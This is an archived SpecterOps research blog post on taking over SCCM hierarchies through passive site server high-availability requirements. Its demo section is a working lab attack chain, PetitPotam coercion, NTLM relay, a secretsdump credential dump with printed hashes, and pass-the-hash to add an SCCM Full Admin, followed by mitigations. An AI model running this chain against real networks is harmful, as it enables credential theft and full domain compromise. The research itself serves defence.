---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-22_sccm-hierarchy-takeover-with-high-availability.md
original_filename: 2024-02-22_sccm-hierarchy-takeover-with-high-availability.md
title: SCCM Hierarchy Takeover with High Availability
category: documents
detected_topics:
- access-control
- supply-chain
- sso
- jwt
- idor
- command-injection
tags:
- imported
- documents
- access-control
- supply-chain
- sso
- jwt
- idor
- command-injection
language: en
raw_sha256: ecca23d9ce59a061a733db8e39317716ed7133628ec6e1f391b153a999b0dde9
text_sha256: d97da5759b54f5764cbf07cd8270b933d2a5d2130a74c12efe046f2bbc20efe9
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: true
---

# SCCM Hierarchy Takeover with High Availability

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-22_sccm-hierarchy-takeover-with-high-availability.md
- Source Type: markdown
- Detected Topics: access-control, supply-chain, sso, jwt, idor, command-injection
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: True
- Raw SHA256: `ecca23d9ce59a061a733db8e39317716ed7133628ec6e1f391b153a999b0dde9`
- Text SHA256: `d97da5759b54f5764cbf07cd8270b933d2a5d2130a74c12efe046f2bbc20efe9`


## Content

---
title: "SCCM Hierarchy Takeover with High Availability"
page_title: "SCCM Hierarchy Takeover with High Availability - SpecterOps"
url: "https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43"
final_url: "https://specterops.io/blog/2024/02/21/sccm-hierarchy-takeover-with-high-availability/"
authors: ["Garrett Foster (@garrfoster)"]
bugs: ["SCCM site takeover"]
publication_date: "2024-02-22"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 413
---

[ Back to Blog  ](/blog)

[Research & Tradecraft](https://specterops.io/blog/category/research/)

# SCCM Hierarchy Takeover with High Availability

Author

[Garrett Foster](https://specterops.io/blog/author/garrett-foster/)

Read Time

15 mins

Published

Feb 21, 2024

##### Share

[ ](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fspecterops.io%2Fblog%2F2024%2F02%2F21%2Fsccm-hierarchy-takeover-with-high-availability%2F&title=SCCM+Hierarchy+Takeover+with+High+Availability&source=SpecterOps) [ ](https://twitter.com/share?url=https%3A%2F%2Fspecterops.io%2Fblog%2F2024%2F02%2F21%2Fsccm-hierarchy-takeover-with-high-availability%2F&text=SCCM+Hierarchy+Takeover+with+High+Availability) [ ](mailto:?Subject=I%20thought%20you'd%20like%20this%20post:%20SCCM Hierarchy Takeover with High Availability&Body=https://specterops.io/blog/2024/02/21/sccm-hierarchy-takeover-with-high-availability/) [ ](https://specterops.io/blog/category/research/feed/)

**TL;DR: SCCM sites configured to support high availability can be abused to compromise the entire hierarchy**

I previously[ wrote about](https://medium.com/specter-ops-posts/site-takeover-via-sccms-adminservice-api-d932e22b2bf) how targeting site systems hosting the SMS Provider role can be used to compromise a SCCM hierarchy. In that blog, I discussed high availability (HA) for the SMS Provider which is designed to support multiple configuration manager console sessions or to support managing SCCM if the SMS provider goes offline. Since then, my coworker Chris Thompson and I started researching more scenarios where environments may introduce other SMS Providers and discovered a HA role for the site server — Chris even alluded to this role in his SCCM[ Hierarchy Takeover](https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087) blog.

Other than the SMS Provider, SCCM historically supported several other HA options for individual site system roles such as distribution points or management points; however, it wasn’t until Microsoft released[ Technical Preview 1806](https://techcommunity.microsoft.com/t5/configuration-manager-blog/update-1806-for-configuration-manager-current-branch-is-now/ba-p/275025) that HA support for the site server role became available. In this release, the “passive” site server role was introduced. This role creates a second dormant, read-only site server for the site it’s configured in that is available in case of emergency. If the primary site server were to crash, go offline, or otherwise become unavailable, the passive site server can be promoted[ manually](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/promote-site-server-flowchart) or[ automatically](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/promote-site-server-unplanned-flowchart) to assume the “active” site server role.

This feature provides a solution for minimizing any sort of downtime or even to support site upgrades or migrations; however, as[ Chris](https://medium.com/specter-ops-posts/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1) and I have previously demonstrated, the privilege escalation vulnerabilities in SCCM stem primarily from the required privileges for the site server role. And, since the passive site server is essentially a copy of the active, nearly identical privileges are required for the passive site server which means the vulnerabilities are bundled in. Let’s walk through some of the[ prerequisites](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/site-server-high-availability#prerequisites) to identify where scenarios for privilege escalation are introduced.

### Abusable Requirements

The first issue that raises an eyebrow is the requirement that the machine account for the passive site server must be a member of the _LOCAL ADMINISTRATORS_ group on the active site server. This is unique to this configuration because an option exists to use a[ site system installation account](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#site-system-installation-account) for other role installations; however, in this case, it is not supported and the documentation even goes so far as to use the word “must.” (Figure 1) This admin requirement can result in hierarchy compromise via credential relaying to the SMB service and I will demonstrate how this can be abused later. You can skip ahead[ here](https://medium.com/@garrfoster/7dcbd3696b43#8b2c) if you’d like.

![](https://cdn-images-1.medium.com/max/1024/0*Pi1a7-lBDtu1PrqB)Figure 1: Passive Requirements

Continuing with site system[ administrator requirements](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#elevated-permissions), if a site system installation account is not utilized, the passive site server is required to have the same administrative rights for each site system deployed in the site (Figure 2). This introduces further scenarios for authentication coercion to relay the passive site server to compromise any remote site system role.

![](https://cdn-images-1.medium.com/max/1024/0*Phs7YNjWsOiSCJXk)Figure 2: Site Installation Account

Next, we’ll shift focus to the site database role. Chris shared previously how the sysadmin privilege requirement for the primary site server role can be abused to compromise the hierarchy and the same privilege is required for the passive site server (Figure 3). And again, if a site system installation account isn’t utilized, the passive site server must also be configured as an administrator on the host of the site database server. For more info on how these requirements can be abused, be sure to read[ Chris’s blo](https://medium.com/specter-ops-posts/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)g.

![](https://cdn-images-1.medium.com/max/1024/0*DOSQMPIWnxyAtfEA)Figure 3: Site Database Requirements

Finally, while going through the process of setting up HA in a lab environment, I noticed the SMS Provider role was installed by default on the passive site server. I couldn’t find any documentation that mentioned this would happen or was required but this behavior makes sense. Without the role installed somewhere in the site, administrators would not be able to use the configuration manager console. Mentioned previously, I [wrote about](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf) how this role can be abused for hierarchy privilege escalation.

![](https://cdn-images-1.medium.com/max/1024/0*02h13l2vSLI4pzNa)Figure 4: Site Sever Mode Status ![](https://cdn-images-1.medium.com/max/1024/0*5EAYKzwRg0UizTqf)Figure 5: Passive Site System Roles

Due to all of these requirements, and in addition to various privilege escalation paths where remote site systems are deployed, SCCM sites setup with default configurations of HA are vulnerable to three hierarchy takeover primitives:

  1. Coercing and relaying authentication from the passive site server to the site database MSSQL service
  2. Coercing and relaying authentication from the passive site server to the active site server’s AdminService API
  3. Coercing and relaying authentication from the passive site server to the active site server’s SMB service

### Enumerating Roles

From here, I turned to how this role might be profiled and fortunately there are more prerequisites that can help pinpoint which system is configured as the passive site server. During initial design planning for the SCCM hierarchy, administrators may choose to[ extend](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/network/extend-the-active-directory-schema) the Active Directory (AD) schema to support publishing of SCCM infrastructure. This design provides an easier method of providing a location to store data for clients enrolled in SCCM and how or where they will interact with the various roles in the site. As part of this extension, a new “System Management” container is created under the “System” container for which each site server in the domain is required to have Full Control permissions to facilitate publishing said data. These permissions extend to the passive site server (Figure 6).

![](https://cdn-images-1.medium.com/max/1024/0*Egg8xWuGEc4z4S9t)Figure 6: “System Management” Container Permissions

This container and required privilege provides a method to not only determine whether SCCM is published in the domain but to also identify what systems are configured as site servers by resolving the discretionary access control list (DACL) of the “System Management” container. However, this is limited as it will only yield a list of potential site servers and not how each might be configured. Luckily, another prerequisite can combine with this information to disclose the configuration.

At SCCM’s highest level, the service’s intended purpose is to manage and distribute software for clients and all of that software is stored in the[ content library](https://techcommunity.microsoft.com/t5/configuration-manager-archive/understanding-the-configuration-manager-content-library/ba-p/273349). During initial deployment, SCCM creates directories for and stores the content library locally on the site server and that content is distributed to clients or other distribution points. Consequently, for HA the content library cannot be stored on either site server and must be migrated to a remote system (Figure 7).

![](https://cdn-images-1.medium.com/max/1024/0*Leq7CSlLPTiNCxMF)Figure 7: Content Library Requirements

This migration causes some curious behavior for both site servers for which default shares persist or are created on the respective system and the differences between the two discloses their configuration. The following screenshot (Figure 8) shows the default file shares of the active site server. It’s important to note that these file shares exist even after migration of the content library away from the active site server. Even though the content has been moved away, all the default shares remain.

![](https://cdn-images-1.medium.com/max/1024/0*rAiKMLqhl7Jn3b8j)Figure 8: Active Site Server Default Shares

The next screenshot (Figure 9) shows the default file shares of the passive site server, which are very different from the default file shares of the active site server. This is due to the requirement for the remote content library and the limitation that the site server can no longer support the distribution point role; therefore, the associated default file shares are never created on the passive server.

![](https://cdn-images-1.medium.com/max/1024/0*BmaMW3pCpT6vr7TU)Figure 9: Passive Site Server Default Shares

By combining the DACL requirements for the “System Management” container for all site server roles with the differences in default file shares, we can determine whether the site server is configured as active or passive. This logic has been added to the SMB module in the[ dev branch](https://github.com/garrettfoster13/sccmhunter/tree/dev) of SCCMHunter to automate the discovery process. The “config” column for all identified site servers will now display whether the site server is active or passive (Figure 10). The only requirement is that you have connectivity to each site server to perform the enumeration.

![](https://cdn-images-1.medium.com/max/1024/0*_QRlumFCJKDGZzdx)Figure 10: SCCMHunter Config Update

### Passive to Active SMB Relay Takeover Demo

To recap, due to the passive site server machine account’s membership of the local administrators group on the active site server, an attacker could abuse this requirement to compromise the hierarchy. If SMB signing is not required (default), authentication could be coerced from the passive site server and relayed to the SMB service on the active site server to compromise the host system. The site system’s machine account is a member of the local[ SMS Admins](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/accounts#sms-admins) group, which grants access to the SMS Provider. Knowing this, an attacker could impersonate the active site server and authenticate to its own AdminService API and execute arbitrary commands as a full administrator on the SCCM service. The following (Figure 11) is a demonstration of that attack path.

![](https://cdn-images-1.medium.com/max/1024/1*d537jY_mah_vzK-u7SqYag.png)Figure 11: SMS Admins Membership Settings

[**SCCMHunter**](https://github.com/garrettfoster13/sccmhunter)

The results of the smb module indicate:

  * The _SCCM.INTERNAL.LAB_ and _PASSIVE.INTERNAL.LAB_ systems are both site servers in the “LAB” site
  * The _SCCM.INTERNAL.LAB_ host is the active site server and the _PASSIVE.INTERNAL.LAB_ host is the passive site server
  * SMB signing is disabled on both systems

  
  
  [04:24:43 PM] INFO  [+] Finished profiling Site Servers.  
  [04:24:43 PM] INFO  +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+
  | Hostname  | SiteCode  | SigningStatus  | SiteServer  | SMSProvider  | Config  | MSSQL  |
  +======================+===================+=================+==============+===============+==========+===========+
  | sccm.internal.lab  | LAB  | **False**  | **True**  | True  | **Active**  | False  |
  +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+
  | passive.internal.lab | LAB  | **False**  |**True**  | True  | **Passive** | True  |
  +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+

[**PetitPotam**](https://github.com/topotam/PetitPotam)

  * Valid domain credentials are used to coerce authentication from the _PASSIVE.INTERNAL.LAB_ passive site server to the attacker host

  
  
  ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
  └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd **10.10.100.136 passive.internal.lab**
  
  
  ___  _  _  _  ___  _  
  | _  ___  | |_  (_)  | |_  | _  ___  | |_  __ _  _ __  
  |  _/  / -_)  |  _|  | |  |  _|  |  _/  / _  |  _|  / _` |  | '  
  _|_|_  ___|  ___|  _|_|_  ___|  _|_|_  ___/  ___|  __,_|  |_|_|_| 
  _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
  
  PoC to elicit machine account authentication via some MS-EFSRPC functions
  by topotam (@topotam77)
  
  Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
  
  
  
  Trying pipe lsarpc
  [-] Connecting to ncacn_np:passive.internal.lab[PIPElsarpc]
  [+] Connected!
  [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
  [+] Successfully bound!
  [-] Sending EfsRpcOpenFileRaw!
  [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
  [+] OK! Using unpatched function!
  [-] Sending EfsRpcEncryptFileSrv!
  [+] Got expected ERROR_BAD_NETPATH exception!!
  [+] Attack worked!

[**NTLMRelayx**](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)

  * Authentication from the _PASSIVE.INTERNAL.LAB_ site server is caught and relayed from the attacker host to the _SCCM.INTERNAL.LAB_ active site server. The -socks flag is used to hold the authenticated session open

  
  
  ┌──(adminservice)─(root㉿DEKSTOP-2QO0YEUW)-[/opt/impacket/examples]
  └─# python3 ntlmrelayx.py -t 10.10.100.121 -smb2support **-socks**
  Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra
  
  <----snipped for brevity---->
  
  [*] Servers started, waiting for connections
  Type help for list of commands
  ntlmrelayx> [*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.100.141, attacking target smb://10.10.100.121
  **[*] Authenticating against smb://10.10.100.121 as LAB/PASSIVE$ SUCCEED**
  [*] SOCKS: Adding LAB/PASSIVE$@10.10.100.121(445) to active SOCKS connection. Enjoy
  [*] SMBD-Thread-10 (process_request_thread): Connection from 10.10.100.141 controlled, but there are no more targets left!
  [*] SOCKS: Proxying client session for LAB/PASSIVE$@10.10.100.121(445)

[**Secretsdump**](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

  * Secretsdump is proxied through the existing authenticated session to recover the _SCCM.INTERNAL.LAB_ site server’s hashed credential

  
  
  ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
  └─#  proxychains secretsdump.py lab/passive$@sccm.internal.lab  
  [proxychains] config file found: /etc/proxychains4.conf
  [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
  [proxychains] DLL init: proxychains-ng 4.16
  Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
  
  Password=***REDACTED*** Strict chain  ...  127.0.0.1:1080  ...  10.10.100.121:445  ...  OK
  [*] Target system bootKey: ***REDACTED-SUSPECT-TOKEN***  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:003d349493bc6acfb242ae5c2ff3d819:::
  [*] Dumping cached domain logon information (domain/username:hash)
  INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#***REDACTED-SUSPECT-TOKEN***  [*] Dumping LSA Secrets
  [*] $MACHINE.ACC 
  labSCCM$:aes256-cts-hmac-sha1-96:76bf72e59677dfe072fd6609***REDACTED-SUSPECT-TOKEN***  labSCCM$:aes128-cts-hmac-sha1-96:***REDACTED-SUSPECT-TOKEN***  labSCCM$:des-cbc-md5:5de98a07aefb983e
  LABSCCM$:plain_password_hex:530061002000670044004d003d0066003d00610040004b0073003100750066005b004c004200450047003a003e0038003200630034005e006d006a0057007700430028003b007000770039004f0044006900570040007a00270075006700630063003400550026003a004b002e00740030006d0027002700560026002400240025006e005d00640032003a0071003d0023003e007400230044007100790036007a003300650060002e004f00260029006f00700061003a00640042006c0057002f007900730025006600460076003500420040002b0041003c004200***REDACTED-SUSPECT-TOKEN***  **LABSCCM$:aad3b435b51404eeaad3b435b51404ee:6963d86f6d65497d7b2126d44e6cdb4e:::**[*] DPAPI_SYSTEM 
  dpapi_machinekey:0x***REDACTED-SUSPECT-TOKEN***  dpapi_userkey:0x***REDACTED-SUSPECT-TOKEN***  [*] NL$KM 
  0000  9C 57 96 F5 F0 F6 2A 05  5A 47 71 F3 86 DE E8 7C  .W....*.ZGq....|
  0010  E0 9B 54 94 0D FB DA 44  D3 39 54 1A D2 AF 59 AF  ..T....D.9T...Y.
  0020  E7 71 45 CF 5B BD A2 86  D3 B4 9C E3 98 05 02 16  .qE.[...........
  0030  F9 AC 5F 1E 68 A4 B3 53  29 C8 0C 36 57 13 40 2A  .._.h..S)..6W.@*
  NL$KM:9c5796f5f0f62a055a4771f386dee87ce09b54940dfbda44d339541ad2af59afe77145cf5bbda286d3b49ce3***REDACTED-SUSPECT-TOKEN***  [*] Cleaning up... 
  [*] Stopping service RemoteRegistry

**SCCMHunter**

  * The recovered active site server machine account hash is used to authenticate to the Administration Service API and add an arbitrary user as Full Admin

  
  
  ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/sccmhunter]
  └─# python3 sccmhunter.py admin **-u sccm$ -p aad3b435b51404eeaad3b435b51404ee:6963d86f6d65497d7b2126d44e6cdb4e** -ip 10.10.100.121
  
  (
  888  d8  
  dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e  d88  ,e e,  888,8,  )
  C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "  ##-------->
  Y88D Y888  , Y888  , 888 888 888 888 888 Y888 888P 888 888  888  888  , 888  )
  d,dP  "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888  "YeeP" 888  /
  (
  v0.0.2  
  @garrfoster  
  
  
  
  [06:53:08 PM] INFO  [!] Enter help for extra shell commands  
  () C: >> show_admins 
  [06:53:11 PM] INFO  Tasked SCCM to list current SMS Admins.  
  **[06:53:11 PM] INFO  Current Full Admin Users:  
  [06:53:11 PM] INFO  labAdministrator**  
  () (C:) >> get_user specter
  [06:53:13 PM] INFO  [*] Collecting users...  
  [06:53:13 PM] INFO  [+] User found.  
  [06:53:14 PM] INFO  ------------------------------------------ 
  DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab
  FullDomainName: INTERNAL.LAB  
  FullUserName: specter  
  Mail:  
  NetworkOperatingSystem: Windows NT
  ResourceId: 2063597574  
  sid: S-1-5-21-2391214593-4168590120-2599633397-1109
  UniqueUserName: labspecter  
  UserAccountControl: 66048  
  UserName: specter  
  UserPrincipalName: specter@internal.lab
  ------------------------------------------
  () (C:) >> **add_admin specter S-1-5-21-2391214593-4168590120-2599633397-1109**
  [06:53:19 PM] INFO  Tasked SCCM to add specter as an administrative user.
  [06:53:19 PM] INFO  [+] Successfully added specter as an admin.
  () (C:) >> **show_admins**
  [06:53:20 PM] INFO  Tasked SCCM to list current SMS Admins.
  **[06:53:20 PM] INFO  Current Full Admin Users:**  
  [06:53:20 PM] INFO  labAdministrator  
  [08:46:39 PM] INFO  **specter** 
  
  

**Defensive Considerations**

I’ll again refer to Chris’s great resource on the[ SharpSCCM Wiki](https://github.com/Mayyhem/SharpSCCM/wiki#defensive-recommendations) for a broad look at various vulnerabilities associated with SCCM. The most impactful changes you can make right now to significantly reduce your attack surface for these issues are:

  * Require SMB signing on all site systems (prevents relay to SMB)
  * Require Extended Protection for Authentication (EPA) on the site database (prevents relay to MSSQL)
  * Block all unnecessary connections to site systems, especially SMB, HTTP(s), and MSSQL (reduces coercion via SMB and relay to these services)

For more in depth defensive analysis and even some detection opportunities Chris covered both extensively starting with the[ Mitigation](https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087#4e9a) section of the [Hierarchy Takeover](https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087) blog.

![](https://cdn-images-1.medium.com/max/1024/1*949UDVmRY009-9Hjy9msvA.png)

**Final Thoughts**

I finished off my last blog by saying I’d share how a remote SMS Provider’s site database role can be used to compromise the hierarchy, but that didn’t warrant an entire blog post dedicated solely to that subject. The TL;DR for this path is the SMS Provider has the[ db_owner role](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver16#fixed-database-roles), which means it can be relayed to MSSQL on the site database server just like in Chris’s original site takeover blog.

When I installed the passive role in a lab, the active site server required administrator rights for the passive host since I wasn’t using site installation accounts and I assume this is how most admins are performing deployment as well. This means you could potentially flip directions (i.e., active to passive) and achieve the same results.

Again, we love researching this stuff and have more to share. Chris and Duane Michael ([The Phantom Credentials of SCCM: Why the NAA Won’t Die](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)) will both be presenting[ Misconfiguration Manager: Overlooked and Overprivileged](https://specterops.io/so-con/#session-7) at SpecterOps’s upcoming SO-CON 2024 conference, and will highlight some of the most common SCCM attack paths we’ve observed internally and introducing a model for SCCM attack path management that both red and blue teams can use. And for my final shill, if you’re into SCCM research, come join us in the #sccm channel in the BloodHoundGang Slack!

![](https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=7dcbd3696b43)

* * *

[SCCM Hierarchy Takeover with High Availability](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43) was originally published in [Posts By SpecterOps Team Members](https://posts.specterops.io) on Medium, where people are continuing the conversation by highlighting and responding to this story.

Post Views: 2,108

[ Garrett Foster ](https://specterops.io/blog/author/garrett-foster/)

Senior Security Researcher 

Garrett is a Senior Security Researcher at SpecterOps specializing in Windows tradecraft and attack path development. His research focuses on Active Directory security and enterprise management infrastructure.
